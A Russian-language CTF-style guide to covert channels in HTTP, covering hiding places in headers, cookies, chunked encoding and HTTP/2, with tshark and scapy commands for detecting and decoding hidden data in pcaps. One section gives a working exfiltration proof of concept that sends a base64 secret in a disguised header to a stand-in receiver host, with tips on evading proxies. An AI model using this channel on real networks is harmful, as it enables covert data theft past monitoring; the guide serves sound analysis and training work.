HTTP — это текст, а значит почти любое поле можно использовать как контейнер. Скрытый канал в HTTP строится на том, что сервер и клиент могут добавлять произвольные заголовки, порядок заголовков не фиксирован, а тело ответа можно дробить на чанки произвольного размера. При этом промежуточные устройства (прокси, балансировщики, WAF) чаще всего смотрят только на известные поля и не мешают «мусорным» заголовкам дойти до адресата.

## Где именно прячут данные в HTTP

Классические места сокрытия:

- **Произвольные заголовки.** `X-Data`, `X-Trace`, `X-Request-Id` — любой `X-*` заголовок может нести base64 или шестнадцатеричную строку.
- **Cookie.** Значения cookie часто не валидируются, туда удобно дописать лишний параметр.
- **User-Agent / Referer.** Длинные строки, в которые легко вписать данные, оставаясь похожими на настоящий браузер.
- **Порядок и регистр заголовков.** Даже без изменения значений порядок заголовков может кодировать биты (перестановка = 0/1).
- **Пробелы и отступы.** Лишние пробелы в значениях, trailing whitespace, разные переводы строк (`\n` против `\r\n`).
- **Chunked encoding.** Размеры чанков несут данные, а сами данные маскируются под легитимный ответ.

Для аналитика ключевая мысль: данные могут быть **в структуре**, а не в значении. Поэтому `strings` по pcap часто ничего не даёт — нужно смотреть поля.

## Инструменты и команды

Основные инструменты разбора:

- **`tshark`** — фильтрация и вывод полей HTTP.
- **`scapy`** — программная сборка/разбор пакетов, удобно для кастомных полей.
- **`tcpflow`** — реконструкция HTTP-сессий в отдельные файлы.
- **`Burp Suite`/`mitmproxy`** — перехват и модификация на лету.
- **`ngrep`** — поиск по содержимому трафика.

Показать все HTTP-заголовки запроса и ответа:

```bash
tshark -r capture.pcap -Y "http" -T fields \
  -e http.request.method -e http.host -e http.user_agent \
  -e http.cookie -e http.response.code
```

Вытащить нестандартные заголовки целиком:

```bash
tshark -r capture.pcap -Y "http" -T fields -e http.request.line
```

## Разобранный пример: заголовок с base64

Пусть в pcap есть запрос, где в заголовке `X-Session-Token` лежит строка. Смотрим поля:

```bash
$ tshark -r exfil.pcap -Y 'http.request' -T fields -e http.request.line | head
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
X-Session-Token: ZmxhZ3toZHR0cF9oZWFkZXJ9\r\n
Accept: */*\r\n
```

Декодируем:

```bash
$ echo ZmxhZ3toZHR0cF9oZWFkZXJ9 | base64 -d
flag{http_header}
```

Тот же приём в одну строку по всему трафику — искать всё, что похоже на base64:

```bash
tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | grep -oE '[A-Za-z0-9+/]{16,}={0,2}' | while read s; do
      echo -n "$s -> "; echo "$s" | base64 -d 2>/dev/null; echo;
    done
```

## Chunked encoding как канал

В HTTP/1.1 тело ответа может передаваться чанками: каждый чанк предваряется его размером в hex, затем идёт сам блок данных, а завершает всё чанк нулевой длины. Стеганография здесь бывает двух видов:

1. **Данные в размерах чанков.** Последовательность размеров кодирует биты, а содержимое — безобидный текст.
2. **Данные в «мусорных» чанках.** Между полезными чанками вставляются лишние, которые клиент собирает, а обычный рендер игнорирует.

Пример разбора chunked-ответа через `scapy`:

```python
from scapy.all import rdpcap, TCP, Raw

for pkt in rdpcap("chunked.pcap"):
    if pkt.haslayer(Raw):
        data = pkt[Raw].load
        if b"\r\n" in data and b"Transfer-Encoding" in data:
            print(data[:200])
```

Вытащить только размеры чанков (hex-числа в начале строк) и превратить их в байты:

```bash
$ tshark -r chunked.pcap -Y 'http.file_data' -T fields -e http.file_data \
  | tr -d '\n' | grep -oE '^[0-9a-f]+' 
```

## Обнаружение и анализ pcap

Методика для pcap-задачи:

1. `tshark -z io,phs` — общая статистика протоколов, нет ли подозрительного объёма.
2. `tshark -Y 'http' -T fields -e http.request.line -e http.response.line` — все строки.
3. Поиск аномалий: очень длинные заголовки, повторяющиеся cookie, редкие `X-*` поля.
4. Проверка chunked: размеры чанков, их регулярность.
5. Декодирование подозрительных значений (`base64 -d`, `xxd -r -p`).

Полезный фильтр для длинных нестандартных заголовков:

```bash
tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | awk 'length($0) > 100'
```

## Частые ошибки и подводные камни

- **Искать только значения, игнорировать структуру.** Порядок/регистр заголовков — тоже канал.
- **Забыть про `\r\n`.** `tshark -T fields` добавляет переводы строк в вывод; чистите их.
- **Путать base64 и base64url.** В URL-контексте `+`/`/` заменяются на `-`/`_`.
- **Игнорировать chunked.** Тело может быть разбито на сотни чанков — размеры несут данные.
- **Смотреть только запросы.** Ответ сервера — такой же канал.
- **Пропустить несколько потоков.** Данные могут быть распределены по десяткам запросов и собираться по порядку.

## Сравнительная таблица каналов в HTTP

| Канал | Где | Заметность | Сложность извлечения |
|---|---|---|---|
| Произвольный заголовок | значение `X-*` | средняя | низкая (`tshark`, base64) |
| Cookie | значение cookie | низкая | низкая |
| User-Agent/Referer | длинные строки | средняя | низкая |
| Порядок заголовков | структура | очень низкая | высокая (нужен эталон) |
| Chunked-размеры | тело ответа | низкая | средняя (`scapy`) |
| Пробелы/переводы строк | значения | очень низкая | высокая |

## Что дальше / решение

- Начните с `tshark -Y http -T fields` по всем строкам заголовков.
- Ищите base64/hex и декодируйте; проверяйте cookie и `X-*`.
- Если чисто — разберите chunked (размеры чанков) через `scapy`.
- Сравните с эталонным трафиком: аномалии порядка/регистра — тоже канал.
- Дальше переходите к ICMP/TCP-каналам (`stego-covert-icmp`, `stego-covert-tcp`).

## HTTP/2 и HTTP/3: новые поля для сокрытия

HTTP/2 перестал быть текстовым: заголовки передаются в бинарном формате HPACK, а тело дробится на кадры (frames). Это меняет и каналы. HPACK использует таблицу динамических заголовков, поэтому повторяющиеся поля сжимаются в индекс. Скрытый канал здесь строится на:

- **Псевдозаголовках** (`:authority`, `:path`, `:method`) — их значения редко валидируются глубоко.
- **Приоритетах и весах** — поле `weight` в кадре `HEADERS` может кодировать биты.
- **Padding** — HTTP/2 официально поддерживает выравнивание, и «мусорные» байты padding могут нести данные.
- **Порядке SETTINGS** — параметры соединения можно переставлять.

HTTP/3 работает поверх QUIC, где заголовки снова в QPACK, а данные — в потоках. QUIC даёт дополнительный канал: идентификаторы потоков и значения `stream id` можно подбирать по известному правилу.

```bash
# посмотреть кадры HTTP/2 через tshark
tshark -r h2.pcap -Y "http2" -T fields -e http2.header.name -e http2.header.value | head
```

Практический совет: если трафик не текстовый, а бинарный, `tshark -T fields` с полями `http2.*` или `quic.*` часто показывает значения, которые не видны в hex-дампе целиком.

## Сжатие и Huffman: скрытые биты в заголовках

HTTP/1.1 допускает сжатие заголовков (`Content-Encoding: gzip` для тела, HPACK для HTTP/2). Сжатие вносит неоднозначность: один и тот же текст можно сжать разными способами, меняя длину на несколько байт. Эти «свободные» биты и есть канал. Детектировать его сложно, потому что выравнивание Huffman-кодов выглядит естественно.

Простой приём: сравнивать `Content-Length` заявленный и фактический — расхождение иногда указывает на вставленные данные. Ещё один маркер — нестандартные `Content-Encoding` или их комбинации (`gzip, br`).

## Построение канала на практике

Канал в HTTP строится из двух сторон. Клиент-отправитель вставляет данные в заголовок, сервер-получатель извлекает. Минимальный PoC на Python:

```python
import requests, base64
secret = b"flag{channel}"
headers = {"X-Trace-Id": base64.b64encode(secret).decode()}
requests.get("http://receiver.local/collect", headers=headers)
```

Сторона-получатель (Flask) читает и декодирует:

```python
from flask import Flask, request
import base64
app = Flask(__name__)
@app.route("/collect")
def collect():
    v = request.headers.get("X-Trace-Id", "")
    return base64.b64decode(v).decode()
```

Такой канал выживает через большинство прокси: они пробрасывают неизвестные заголовки. Для маскировки имя заголовка берут похожим на легитимное (`X-Amzn-Trace-Id`, `X-Request-Id`).

## Автоматизация извлечения

Когда трафика много, ручной разбор не масштабируется. Пишут скрипт, который проходит по всем HTTP-запросам, вытаскивает все значения заголовков, фильтрует по энтропии и пробует декодировать.

```python
from scapy.all import rdpcap, TCP, Raw
import re, base64
for pkt in rdpcap("exfil.pcap"):
    if pkt.haslayer(Raw):
        txt = pkt[Raw].load.decode("latin-1", "ignore")
        for m in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", txt):
            try:
                dec = base64.b64decode(m).decode()
                print(m, "->", dec)
            except Exception:
                pass
```

Скрипт стоит дополнить: учётом нескольких пакетов на один запрос, дедупликацией и сортировкой по времени. Именно сортировка по `frame.time` восстанавливает порядок, если сообщение разбито между запросами.

## Сравнение с DNS- и ICMP-туннелями

HTTP-канал удобнее там, где разрешён только веб. DNS-туннель меньше по объёму (имена короткие), но выживает при агрессивной фильтрации. ICMP-туннель не зависит от веб-прокси, но часто блокируется на периметре. HTTP сочетает большой объём (заголовки + тело) с высокой пропускной способностью, поэтому в CTF и в реальных эксфильтрациях встречается чаще всего.

## Этические и правовые границы

Скрытые каналы — двойственная техника: с одной стороны, это инструмент пентеста и обхода цензуры, с другой — способ эксфильтрации и C2. Использовать их допустимо только в рамках авторизованного тестирования или собственной инфраструктуры. При анализе чужих pcap важно помнить о приватности: даже заголовки несут персональные данные (cookies, токены).
